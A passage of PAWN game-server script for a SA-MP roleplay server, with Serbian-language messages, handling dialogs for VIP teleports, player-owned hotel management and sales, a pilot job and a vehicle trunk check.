					format( globalstring, sizeof( globalstring ), "VPORT | %s se teleportovao do Banke", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 6: {
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 3 ) return SendErrorMessage( playerid, "Ovaj port moze da koristi samo VIP Level 3+." );
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 1199.4117, -1329.5920, 13.1032 ); }
					else { PortajIgraca( playerid, 1199.4117, -1329.5920, 13.1032 ); }
					SendInfoMessage( playerid, "Teleportovao si do Bolnice." );
					format( globalstring, sizeof( globalstring ), "VPORT | %s se teleportovao do Bolnice", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 7: {
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 4 ) return SendErrorMessage( playerid, "Ovaj port moze da koristi samo VIP Level 4+." );
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 1719.7505, -1280.6212, 13.1646 ); }
					else { PortajIgraca( playerid, 1719.7505, -1280.6212, 13.1646 ); }
					SendInfoMessage( playerid, "Teleportovao si do Lotto." );
					format( globalstring, sizeof( globalstring ), "VPORT | %s se teleportovao do Lotto", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 8: {
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 4 ) return SendErrorMessage( playerid, "Ovaj port moze da koristi samo VIP Level 4+." );
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 1131.7944, -1279.9059, 13.2800 ); }
					else { PortajIgraca( playerid, 1131.7944, -1279.9059, 13.2800 ); }
					SendInfoMessage( playerid, "Teleportovao si do Zlatara." );
					format( globalstring, sizeof( globalstring ), "VPORT | %s se teleportovao do Zlatare", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 9: {
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 4 ) return SendErrorMessage( playerid, "Ovaj port moze da koristi samo VIP Level 4+." );
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 1557.9094, -1299.3582, 16.4217 ); }
					else { PortajIgraca( playerid, 1557.9094, -1299.3582, 16.4217 ); }
					SendInfoMessage( playerid, "Teleportovao si do Auto salon AUDI." );
					format( globalstring, sizeof( globalstring ), "VPORT | %s se teleportovao do Auto salon AUDI", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 10: {
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 4 ) return SendErrorMessage( playerid, "Ovaj port moze da koristi samo VIP Level 4+." );
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 1001.3659, -1323.4409, 13.0922 ); }
					else { PortajIgraca( playerid, 1001.3659, -1323.4409, 13.0922 ); }
					SendInfoMessage( playerid, "Teleportovao si do Spawn 1." );
					format( globalstring, sizeof( globalstring ), "VPORT | %s se teleportovao do Spawn 1", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 11: {
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 4 ) return SendErrorMessage( playerid, "Ovaj port moze da koristi samo VIP Level 4+." );
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 1172.3173, -1743.6185, 13.1039 ); }
					else { PortajIgraca( playerid, 1172.3173, -1743.6185, 13.1039 ); }
					SendInfoMessage( playerid, "Teleportovao si do Spawn 2." );
					format( globalstring, sizeof( globalstring ), "VPORT | %s se teleportovao do Spawn 2", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 12: { 
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 5 ) return SendErrorMessage( playerid, "Ovaj port moze da koristi samo VIP Level 5+." );
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 1324.9801, -927.1485, 36.7510 ); }
					else { PortajIgraca( playerid, 1324.9801, -927.1485, 36.7510 ); }
					SendInfoMessage( playerid, "Teleportovao si do Marketa Lidl." );
					format( globalstring, sizeof( globalstring ), "VPORT | %s se teleportovao do Marketa Lidl", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 13: {
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 5 ) return SendErrorMessage( playerid, "Ovaj port moze da koristi samo VIP Level 5+." );
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 1259.3237, -1330.0686, 12.7364 ); }
					else { PortajIgraca( playerid, 1259.3237, -1330.0686, 12.7364 ); }
					SendInfoMessage( playerid, "Teleportovao si do Marketa Konzum." );
					format( globalstring, sizeof( globalstring ), "VPORT | %s se teleportovao do Marketa Konzum", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 14: {
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 5 ) return SendErrorMessage( playerid, "Ovaj port moze da koristi samo VIP Level 5+." );
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 581.5129, -1853.2206, 4.6748 ); }
					else { PortajIgraca( playerid, 581.5129, -1853.2206, 4.6748 ); }
					SendInfoMessage( playerid, "Teleportovao si do plaze." );
					format( globalstring, sizeof( globalstring ), "VPORT | %s se teleportovao do plaze", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 15: {
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 5 ) return SendErrorMessage( playerid, "Ovaj port moze da koristi samo VIP Level 5+." );
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 1963.6678, -2195.9578, 13.2526 ); }
					else { PortajIgraca( playerid, 1963.6678, -2195.9578, 13.2526 ); }
					SendInfoMessage( playerid, "Teleportovao si do aerodroma." );
					format( globalstring, sizeof( globalstring ), "VPORT | %s se teleportovao do aerodroma", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			    case 16: {
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 5 ) return SendErrorMessage( playerid, "Ovaj port moze da koristi samo VIP Level 5+." );
			        if( GetPlayerState( playerid ) == 2 ) { Novi_SetVehiclePos( tmpcar, 993.0018, -956.7341, 40.7201 ); }
					else { PortajIgraca( playerid, 993.0018, -956.7341, 40.7201 ); }
					SendInfoMessage( playerid, "Teleportovao si do lukoil pumpe." );
					format( globalstring, sizeof( globalstring ), "VPORT | %s se teleportovao do lukoil pump", ImeIgraca( playerid ) );
					AdminPoruka( NARACRVENA, globalstring );
			    }
			}
			VIPPort[ playerid ] = 60;
			SetPlayerInterior( playerid, 0 );
			SetPlayerVirtualWorld( playerid, 0 );
		}
	}
	else if( dialogid == dialog_SELECTAPORT ) {
	    if( !response ) return 1;
		if( response ) {
            new tmpcar = GetPlayerVehicleID( playerid );
			if( GetPlayerState( playerid ) == 2 ) {
		 		Novi_SetVehiclePos( tmpcar, aportInfo[ listitem ][ aportPos ][ 0 ], aportInfo[ listitem ][ aportPos ][ 1 ], aportInfo[ listitem ][ aportPos ][ 2 ] );
		 	}
			else {
				PortajIgraca( playerid, aportInfo[ listitem ][ aportPos ][ 0 ], aportInfo[ listitem ][ aportPos ][ 1 ], aportInfo[ listitem ][ aportPos ][ 2 ] );
			}
			SetPlayerInterior( playerid, 0 );
			SetPlayerVirtualWorld( playerid, 0 );
			SendInfoMessage( playerid, "Teleportovao si kod %s.", aportInfo[ listitem ][ aportName ] );
            if(PlayerInfo[playerid][xVIPLevel] >= 1) {

                new time;
                switch(PlayerInfo[playerid][xVIPLevel]) {

                    case 1: 
                        time = 180;
                    case 2, 3, 4:
                        time = 60;
                    case 5:
                        time = 45;
                    case 6:
                        time = 30;
                }
                VIPPort[ playerid ] = time;
                SendInfoMessage(playerid, "Sledeci port mozete koristiti za %d sekundi!", time);
            }
		}
	}
	else if( dialogid == dialog_SELECTSPORT ) {
	    if( !response ) return 1;
		if( response ) {
            new tmpcar = GetPlayerVehicleID( playerid );
			if( GetPlayerState( playerid ) == 2 ) {
		 		Novi_SetVehiclePos( tmpcar, supportInfo[ listitem ][ supportPos ][ 0 ], supportInfo[ listitem ][ supportPos ][ 1 ], supportInfo[ listitem ][ supportPos ][ 2 ] );
		 	}
			else {
				PortajIgraca( playerid, supportInfo[ listitem ][ supportPos ][ 0 ], supportInfo[ listitem ][ supportPos ][ 1 ], supportInfo[ listitem ][ supportPos ][ 2 ] );
			}
			SetPlayerInterior( playerid, 0 );
			SetPlayerVirtualWorld( playerid, 0 );
			SendInfoMessage( playerid, "Teleportovao si kod %s.", supportInfo[ listitem ][ supportName ] );
		}
	}
	else if( dialogid == dialog_HOTEL ) {
	    if( response ) {
			switch( listitem ) {
			    case 0: {
			        if( inHotel[ playerid ] != PlayerInfo[ playerid ][ xHotelID ] ) return SendErrorMessage( playerid, "Morate biti u hotelu!");
                    new string[ 128 ], hid = PlayerInfo[ playerid ][ xHotelID ];
					strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
                    strcat( DialogStrgEx, "__________________________________________________________________\n \n");
                    strcat( DialogStrgEx, "Hotel - Informacije\n \n" );
					format( string, sizeof( string ), "Racun hotela: [%d$] | Cena najma: [%d$]\n \n", hotelInfo[ hid ][ hMoney ], hotelInfo[ hid ][ hRoomPrice ] );
			        strcat( DialogStrgEx, string );
	                format( string, sizeof( string ), "Gost u sobi 1: %s\n", hotelInfo[ hid ][ hGuest_1 ] );
                    strcat( DialogStrgEx, string );
                    format( string, sizeof( string ), "Gost u sobi 2: %s\n", hotelInfo[ hid ][ hGuest_2 ] );
                    strcat( DialogStrgEx, string );
                    format( string, sizeof( string ), "Gost u sobi 3: %s\n", hotelInfo[ hid ][ hGuest_3 ] );
                    strcat( DialogStrgEx, string );
                    format( string, sizeof( string ), "Gost u sobi 4: %s\n", hotelInfo[ hid ][ hGuest_4 ] );
                    strcat( DialogStrgEx, string );
                    format( string, sizeof( string ), "Gost u sobi 5: %s\n", hotelInfo[ hid ][ hGuest_5 ] );
                    strcat( DialogStrgEx, string );
                    format( string, sizeof( string ), "Gost u sobi 6: %s\n", hotelInfo[ hid ][ hGuest_6 ] );
                    strcat( DialogStrgEx, string );
					format( string, sizeof( string ), "Gost u sobi 7: %s\n", hotelInfo[ hid ][ hGuest_7 ] );
                    strcat( DialogStrgEx, string );
                    format( string, sizeof( string ), "Gost u sobi 8: %s\n", hotelInfo[ hid ][ hGuest_8 ] );
                    strcat( DialogStrgEx, string );
                    format( string, sizeof( string ), "Gost u sobi 9: %s\n", hotelInfo[ hid ][ hGuest_9 ] );
                    strcat( DialogStrgEx, string );
                    format( string, sizeof( string ), "Gost u sobi 10: %s\n \n", hotelInfo[ hid ][ hGuest_10 ] );
                    strcat( DialogStrgEx, string );
			        strcat( DialogStrgEx, "__________________________________________________________________");
			        ShowPlayerDialog( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "U redu", "" );
					strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

			    }
			    case 1: {
			        if( inHotel[ playerid ] != PlayerInfo[ playerid ][ xHotelID ] ) return SendErrorMessage( playerid, "Morate biti u hotelu!");
  					SPD( playerid, dialog_HOTELRENTP, DSI, D_NASLOV, "Molimo vas da unesete vasu cenu najma sobe.", D_ODABERI, D_ODUSTANI );
			    }
			    case 2: {
			        if( inHotel[ playerid ] != PlayerInfo[ playerid ][ xHotelID ] ) return SendErrorMessage( playerid, "Morate biti u hotelu!");
			        new hid = PlayerInfo[ playerid ][ xHotelID ];
			        new string[ 260 ];
          			format( string, sizeof( string ), ""col_white"%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s",
			        	hotelInfo[ hid ][ hGuest_1 ],
			            hotelInfo[ hid ][ hGuest_2 ],
			            hotelInfo[ hid ][ hGuest_3 ],
			            hotelInfo[ hid ][ hGuest_4 ],
                        hotelInfo[ hid ][ hGuest_5 ],
			            hotelInfo[ hid ][ hGuest_6 ],
			            hotelInfo[ hid ][ hGuest_7 ],
			            hotelInfo[ hid ][ hGuest_8 ],
			            hotelInfo[ hid ][ hGuest_9 ],
			            hotelInfo[ hid ][ hGuest_10 ] );
					SPD( playerid, dialog_HOTELIZBACI, DSL, "Izaberite koga zelite izbaciti:", string, D_ODABERI, D_ODUSTANI );
			    }
			    case 3: {
			        if( inHotel[ playerid ] != PlayerInfo[ playerid ][ xHotelID ] ) return SendErrorMessage( playerid, "Morate biti u hotelu!");
  					SPD( playerid, dialog_HPMONEY, DSI, D_NASLOV, "Molimo vas da unesete kolicinu novca koju zelite da podignete.", D_ODABERI, D_ODUSTANI );
			    }
			    case 4: {
			        if( inHotel[ playerid ] != PlayerInfo[ playerid ][ xHotelID ] ) return SendErrorMessage( playerid, "Morate biti u hotelu!");
  					SPD( playerid, dialog_HOMONEY, DSI, D_NASLOV, "Molimo vas da unesete kolicinu novca koju zelite da ostavite.", D_ODABERI, D_ODUSTANI );
			    }
			    case 5: {
			        if( inHotel[ playerid ] != PlayerInfo[ playerid ][ xHotelID ] && GetNearestHotel( playerid ) != PlayerInfo[ playerid ][ xHotelID ] ) return SendErrorMessage( playerid, "Morate biti u/pored hotelu/a!");
                    SPD( playerid, dialog_HOTELLOCK, DSMSG, D_NASLOV, "Molimo vas da odaberete da li zelite da ?", "Otkljucate", "Zakljucate" );
				}
				case 6: {
				    if( GetNearestHotel( playerid ) != PlayerInfo[ playerid ][ xHotelID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza hotela!");
    				SPD( playerid, dialog_HOTELSELLDRZAVA, DSMSG, D_NASLOV, "Da li ste sigurni da zelite prodati vas hotel drzavi?", "Da", "Ne" );
				}
				case 7: {
				    if( GetNearestHotel( playerid ) != PlayerInfo[ playerid ][ xHotelID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza hotela!");
				    SPD( playerid, dialog_HOTELSELLTP, DSI, D_NASLOV, "U prazni prostor ispod unesite ID igraca i cenu hotel", "Ponudi", D_ODUSTANI );
				}
			}
		}
	}
	else if( dialogid == dialog_HOTELSELLTP ) {
	    if( !response ) return 1;
	    if( response ) {
	        if( PlayerInfo[ playerid ][ xBRacun ] < 0 ) return SendErrorMessage( playerid, "Ne mozes da prodas hotel dok ne izadjes iz minusa u banci." );
	        new id = PlayerInfo[ playerid ][ xHotelID ];
	        new idigraca, cena, string[ 128 ], Float:Pos[ 3 ];
	        if( sscanf( inputtext, "ui", idigraca, cena ) ) return SPD( playerid, dialog_HOTELSELLTP, DSI, D_NASLOV, "U prazni prostor ispod unesite ID igraca i cenu hotel", "Ponudi", D_ODUSTANI );
            GetPlayerPos( idigraca, Pos[0], Pos[1], Pos[2] );
			if( !IsPlayerInRangeOfPoint( playerid, 3.0, Pos[0], Pos[1], Pos[2] ) ) return SendErrorMessage( playerid, "Igrac nije blizu vas");
			if( cena < 1 ) return SendErrorMessage( playerid, "Cena ne moze biti manja od 1$!");
			if( idigraca == IPI ) return SendErrorMessage( playerid, "Pogresan ID." );
			if( idigraca == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi prodati hotel!");
			if( PlayerInfo[ idigraca ][ xHotelID ] != -1 )return SendErrorMessage( playerid, "Igrac vec ima hotel!");
            if( PlayerInfo[ idigraca ][ xLevel ] < hotelInfo[ id ][ hLevel ] ) return SendClientMessageEx( playerid, CRVENA, "Igrac mora biti level %d+ da bi ste mu prodali hotel.", hotelInfo[ id ][ hLevel ] );
			SendClientMessageEx( playerid, SVETLOPLAVA, "Ponudili ste igracu %s hotel po ceni od %d.", ImeIgraca( idigraca ), cena );
			GlobalProdaja[ idigraca ] = playerid;
			GlobalCena[ idigraca ] = cena;
			format( string, sizeof( string ), "Igrac %s vam je ponudio da kupite njegov hotel za %d", ImeIgraca( playerid ), cena );
			SPD( idigraca, dialog_ACCEPTHOTEL, DSMSG, D_NASLOV, string, "Prihvati", "Odbij" );
	    }
	}
	else if( dialogid == dialog_ACCEPTHOTEL ) {
	    if( response ) {
	        new id = PlayerInfo[ GlobalProdaja[ playerid ] ][ xHotelID ];
	        if( PlayerInfo[ playerid ][ xNovac ] < GlobalCena[ playerid ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca.");

            new string1[ 128 ]; 
			format( string1, sizeof( string1 ), "Igrac %s je prodao hotel ID %d igracu %s za %d", ImeIgraca( GlobalProdaja[ playerid ] ), id, ImeIgraca( playerid ), GlobalCena[ playerid ] );
			LogSave( "Ostalo/LogProdajaImovine.log", string1 );

			SendClientMessageEx( playerid, SVETLOPLAVA, "Uspesno ste kupili hotel od igraca %s za $d.", ImeIgraca( GlobalProdaja[ playerid ] ), GlobalCena[ playerid ] );

			PlayerInfo[ GlobalProdaja[ playerid ] ][ xHotelID ] = -1;
			PlayerInfo[ playerid ][ xHotelID ] = id;
			strmid( hotelInfo[ id ][ hOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
			SaveHotel( id ); HotelRefresh( id );
			SavePlayer( playerid ); SavePlayer( GlobalProdaja[ playerid ] );
			format( globalstring, sizeof( globalstring ), "Prodali ste hotel igracu %s za %d!", ImeIgraca( playerid ), GlobalCena[ playerid ] );
			SCM( GlobalProdaja[ playerid ], -1, globalstring );
			DajIgracuNovac( GlobalProdaja[ playerid ], GlobalCena[ playerid ] );
			DajIgracuNovac( playerid, -GlobalCena[ playerid ] );
			SCM( playerid, -1, "Kupili ste hotel!" );
			GlobalProdaja[ playerid ] = -1;
			GlobalCena[ playerid ] = -1;
	    }
	    else if( !response ) {
			format( globalstring, sizeof( globalstring ),"Igrac %s je odbio vasu ponudu za kupovinu hotelaa!", ImeIgraca( playerid ) );
			SCM( GlobalProdaja[ playerid ], -1, globalstring );
			SCM( playerid, -1, "Odbili ste ponudu!");
			GlobalProdaja[ playerid ] = -1;
			GlobalCena[ playerid ] = -1;
	    }
	}
	else if( dialogid == dialog_HOTELSELLDRZAVA ) {
	    if( response ) {
	        if( PlayerInfo[ playerid ][ xBRacun ] < 0 ) return SendErrorMessage( playerid, "Ne mozes da prodas hotel dok ne izadjes iz minusa u banci." );
	        new id = PlayerInfo[ playerid ][ xHotelID ];
   	 		if( PlayerInfo[ playerid ][ xHotelID ] == -1 ) return SendErrorMessage( playerid, "Ne posedujes hotel!");
            if( GetNearestHotel( playerid ) != PlayerInfo[ playerid ][ xHotelID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza hotela!");

            new string1[ 128 ]; 
			format( string1, sizeof( string1 ), "Igrac %s je prodao hotel ID %d na buy", ImeIgraca( playerid ), id );
			LogSave( "Ostalo/LogProdajaImovine.log", string1 );

			hotelInfo[ id ][ hOwned ] = 0;
    		strmid( hotelInfo[ id ][ hOwner ], "Drzava", 0, strlen( "Drzava" ), 24 );
    		hotelInfo[ id ][ hLocked ] = 0;
    		DajIgracuNovac( playerid, hotelInfo[ id ][ hPrice ]/2 );
    		PlayerInfo[ playerid ][ xHotelID ] = -1;
    		SaveHotel( id );
    		SendInfoMessage( playerid, "Hotel uspesno prodana!" );
    		HotelRefresh( id );
    		SavePlayer( playerid );
		}
		if( !response ) {
		    SCM( playerid, -1, "Odustali ste od prodaje hotela drzavi." );
		}
	}
	else if( dialogid == dialog_HOTELLOCK ) {
	    new hid = PlayerInfo[ playerid ][ xHotelID ];
        if( inHotel[ playerid ] != PlayerInfo[ playerid ][ xHotelID ] && GetNearestHotel( playerid ) != PlayerInfo[ playerid ][ xHotelID ] ) return SendErrorMessage( playerid, "Morate biti u/pored hotelu/a!");
  		if( response ) {
            hotelInfo[ hid ][ hLocked ] = 0;
        	GameTextForPlayer( playerid, "Hotel ~g~otkljucana!", 3000, 3 );
        	SaveHotel( hid );
		}
		else {
		    hotelInfo[ hid ][ hLocked ] = 1;
        	GameTextForPlayer( playerid, "Hotel ~r~zakljucana!", 3000, 3 );
        	SaveHotel( hid );
		}
	}
	else if( dialogid == dialog_HOTELRENTP ) {
	    if( response ) {
	        if( inHotel[ playerid ] != PlayerInfo[ playerid ][ xHotelID ] ) return SendErrorMessage( playerid, "Morate biti u hotelu!");
	        new iznos, hid = PlayerInfo[ playerid ][ xHotelID ];
	        if( sscanf( inputtext, "i", iznos ) ) return SPD( playerid, dialog_HOTELRENTP, DSI, D_NASLOV, "Molimo vas da unesete vasu cenu najma sobe.", D_ODABERI, D_ODUSTANI );
			if( iznos < 1 || iznos > 1000 ) return SendErrorMessage( playerid, "Cena najma ne moze biti ispod 1 i iznad 1000!");
			hotelInfo[ hid ][ hRoomPrice ] = iznos;
			SaveHotel( hid ); HotelRefresh( hid );
			SendClientMessageEx( playerid, SRVBOJA1, "Uspesno ste promenili cenu najma u %d$.", iznos );
		}
	}
	else if( dialogid == dialog_HOTELIZBACI ) {
	    if( response ) {
	        if( inHotel[ playerid ] != PlayerInfo[ playerid ][ xHotelID ] ) return SendErrorMessage( playerid, "Morate biti u hotelu!");
			new hid = PlayerInfo[ playerid ][ xHotelID ];
	        switch( listitem ) {
		    	case 0: {
		    	    if( strcmp( hotelInfo[ hid ][ hGuest_1 ], "Niko", true ) ) {
						SendClientMessageEx( playerid, SRVBOJA1, "Uspesno ste izbacili %s iz sobe.", hotelInfo[ hid ][ hGuest_1 ] );
						strmid( hotelInfo[ hid ][ hGuest_1 ], "Niko", 0, strlen( "Niko" ), 24  );
					}
		    	}
		    	case 1: {
		    	    if( strcmp( hotelInfo[ hid ][ hGuest_2 ], "Niko", true ) ) {
						SendClientMessageEx( playerid, SRVBOJA1, "Uspesno ste izbacili %s iz sobe.", hotelInfo[ hid ][ hGuest_2 ] );
						strmid( hotelInfo[ hid ][ hGuest_2 ], "Niko", 0, strlen( "Niko" ), 24  );
					}
		    	}
		    	case 2: {
		    	    if( strcmp( hotelInfo[ hid ][ hGuest_3 ], "Niko", true ) ) {
						SendClientMessageEx( playerid, SRVBOJA1, "Uspesno ste izbacili %s iz sobe.", hotelInfo[ hid ][ hGuest_3 ] );
						strmid( hotelInfo[ hid ][ hGuest_3 ], "Niko", 0, strlen( "Niko" ), 24  );
					}
		    	}
		    	case 3: {
		    	    if( strcmp( hotelInfo[ hid ][ hGuest_4 ], "Niko", true ) ) {
						SendClientMessageEx( playerid, SRVBOJA1, "Uspesno ste izbacili %s iz sobe.", hotelInfo[ hid ][ hGuest_4 ] );
						strmid( hotelInfo[ hid ][ hGuest_4 ], "Niko", 0, strlen( "Niko" ), 24  );
					}
		    	}
		    	case 4: {
		    	    if( strcmp( hotelInfo[ hid ][ hGuest_5 ], "Niko", true ) ) {
						SendClientMessageEx( playerid, SRVBOJA1, "Uspesno ste izbacili %s iz sobe.", hotelInfo[ hid ][ hGuest_5 ] );
						strmid( hotelInfo[ hid ][ hGuest_5 ], "Niko", 0, strlen( "Niko" ), 24  );
					}
		    	}
		    	case 5: {
		    	    if( strcmp( hotelInfo[ hid ][ hGuest_6 ], "Niko", true ) ) {
						SendClientMessageEx( playerid, SRVBOJA1, "Uspesno ste izbacili %s iz sobe.", hotelInfo[ hid ][ hGuest_6 ] );
						strmid( hotelInfo[ hid ][ hGuest_6 ], "Niko", 0, strlen( "Niko" ), 24  );
					}
		    	}
		    	case 6: {
		    	    if( strcmp( hotelInfo[ hid ][ hGuest_7 ], "Niko", true ) ) {
						SendClientMessageEx( playerid, SRVBOJA1, "Uspesno ste izbacili %s iz sobe.", hotelInfo[ hid ][ hGuest_7 ] );
						strmid( hotelInfo[ hid ][ hGuest_7 ], "Niko", 0, strlen( "Niko" ), 24  );
					}
		    	}
		    	case 7: {
		    	    if( strcmp( hotelInfo[ hid ][ hGuest_8 ], "Niko", true ) ) {
						SendClientMessageEx( playerid, SRVBOJA1, "Uspesno ste izbacili %s iz sobe.", hotelInfo[ hid ][ hGuest_8 ] );
						strmid( hotelInfo[ hid ][ hGuest_8 ], "Niko", 0, strlen( "Niko" ), 24  );
					}
		    	}
		    	case 8: {
		    	    if( strcmp( hotelInfo[ hid ][ hGuest_9 ], "Niko", true ) ) {
						SendClientMessageEx( playerid, SRVBOJA1, "Uspesno ste izbacili %s iz sobe.", hotelInfo[ hid ][ hGuest_9 ] );
						strmid( hotelInfo[ hid ][ hGuest_9 ], "Niko", 0, strlen( "Niko" ), 24  );
					}
		    	}
		    	case 9: {
		    	    if( strcmp( hotelInfo[ hid ][ hGuest_10 ], "Niko", true ) ) {
						SendClientMessageEx( playerid, SRVBOJA1, "Uspesno ste izbacili %s iz sobe.", hotelInfo[ hid ][ hGuest_10 ] );
						strmid( hotelInfo[ hid ][ hGuest_10 ], "Niko", 0, strlen( "Niko" ), 24  );
					}
		    	}
			}
			SaveHotel( hid );
	    }
	}
	else if( dialogid == dialog_HOMONEY ) {
		if( !response ) return true;
		if( response ) {
		    if( inHotel[ playerid ] != PlayerInfo[ playerid ][ xHotelID ] ) return SendErrorMessage( playerid, "Morate biti u hotelu!");
			new iznos, hid = PlayerInfo[ playerid ][ xHotelID ];
			if( sscanf(inputtext, "i", iznos ) ) return SPD( playerid, dialog_HOMONEY, DSI, D_NASLOV, "Molimo vas da unesete kolicinu novca koju zelite da ostavite.", D_ODABERI, D_ODUSTANI );
			if( iznos < 1 || iznos > 10000) return SendErrorMessage( playerid, "Kolicina novca ne moze biti ispod 1 i iznad 10000!");
            if( iznos > PlayerInfo[ playerid  ][ xNovac ] ) return SendErrorMessage( playerid, "Nemate toliko novca kod sebe!");
			DajIgracuNovacSpeech( playerid, -iznos ); hotelInfo[ hid ][ hMoney ] += iznos;
			SendInfoMessage( playerid, "Ostavili ste %d$ u kasu hotela!", iznos );
		    SaveHotel( hid );
			SavePlayer( playerid );
		}
	}
	else if( dialogid == dialog_HPMONEY ) {
		if( !response ) return true;
		if( response ) {
		    if( inHotel[ playerid ] != PlayerInfo[ playerid ][ xHotelID ] ) return SendErrorMessage( playerid, "Morate biti u hotelu!");
			new iznos, hid = PlayerInfo[ playerid ][ xHotelID ];
			if( sscanf( inputtext, "i", iznos ) ) return SPD( playerid, dialog_HPMONEY, DSI, D_NASLOV, "Molimo vas da unesete kolicinu novca koju zelite da podignete.", D_ODABERI, D_ODUSTANI );
			if( iznos < 1 || iznos > 10000 ) return SendErrorMessage( playerid, "Kolicina novca ne moze biti ispod 1 i iznad 10000!");
            if( iznos > hotelInfo[ hid ][ hMoney ] ) return SendErrorMessage( playerid, "Nemate toliko novca u kasi!");
			DajIgracuNovacSpeech( playerid, iznos ); hotelInfo[ hid ][ hMoney ] -= iznos;
			SendInfoMessage( playerid, "Podigli ste %d$ iz kase hotela!", iznos );
		    SaveHotel( hid );
			SavePlayer( playerid );
		}
	}
	else if( dialogid == dialog_PILOT ) {
		if( !response ) return true;
		if( response ) {
			switch( listitem ) {
			    case 0: {
			        if( GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 519 || GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 553  ) {
				        Novi_SetPlayerCheckpoint( playerid, 1847.4221, -2414.0798, 13.5547, 5.0 );
						LetSF[ playerid ] = 1; CheckpointStatus[ playerid ] = 20;
						SendJobMessage( playerid, "Krenuli ste sa poslom, prevozite putnike u SF.");
						StaroVreme[ playerid ] = gettime();
    					NovoVreme[ playerid ] = 120;
					}
			    }
			    case 1: {
			        if( GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 519 || GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 553  ) {
				        Novi_SetPlayerCheckpoint( playerid, 1847.4221, -2414.0798, 13.5547, 5.0 );
						LetLV[ playerid ] = 1; CheckpointStatus[ playerid ] = 21;
						SendJobMessage( playerid, "Krenuli ste sa poslom, prevozite putnike u LV.");
						StaroVreme[ playerid ] = gettime();
    					NovoVreme[ playerid ] = 120;
					}
			    }
			}
		}
	}
	else if( dialogid == dialog_GEPEK ) {
		if( !response ) return true;
		if( response ) {
		    new vehicleid, found, engine, lights, alarm, doors, bonnet, boot, objective;
		    for( new i = 0; i < MAX_VEHICLES; i++) {
		        new Float:X, Float:Y, Float:Z;
		        GetVehiclePos(i, X, Y, Z);
		        if( IsPlayerInRangeOfPoint( playerid, 5.0, X, Y, Z)) {
		            vehicleid = i;
		            found = 1;
		            break;
		        }
		        else
		            continue;
		    }
			if( found == 0 ) return SendErrorMessage( playerid, "Niste blizu vozila.");

		    new Float:vehPos[ 3 ];
			getPosBehindVehicle( vehicleid, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ], 0.0 );
			if( !IsPlayerInRangeOfPoint( playerid, 2, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ] ) ) return SendErrorMessage( playerid, "Morate biti pored prtljaznika." );

			if( IsANoTrunkVehicle( vehicleid ) ) return SendErrorMessage( playerid, "Ovo vozilo nema prtljaznik!");
			if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama.");
			if( IsVehicleBajs( vehicleid ) || IsVehicleMotor( vehicleid ) || IsVehicleBrod( vehicleid ) ) {
				SendErrorMessage( playerid, "Nepoznata akcija.");
				return 1;
			}
			
			if(PrivatnoVozilo(vehicleid)) {
			
			    if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] != -1 && VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 0 ] ][ vID ] == vehicleid ) { }
			    else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] != -1 && VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 1 ] ][ vID ] == vehicleid ) { }
